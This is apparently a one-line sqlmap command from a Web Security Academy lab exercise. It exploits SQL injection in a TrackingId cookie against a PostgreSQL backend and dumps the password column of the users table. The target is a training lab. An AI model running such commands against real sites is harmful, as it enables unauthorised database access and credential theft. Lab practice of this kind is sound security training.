python sqlmap.py --cookie="TrackingId=73AxIbTWu43FZHDC" -u "https://0aba00cc031749f583b806ed000100d1.web-security-academy.net/filter?category=Accessories" \
-p "TrackingId" --skip "category" --level 2 --dbms=PostgreSQL  -T users -C password --dump
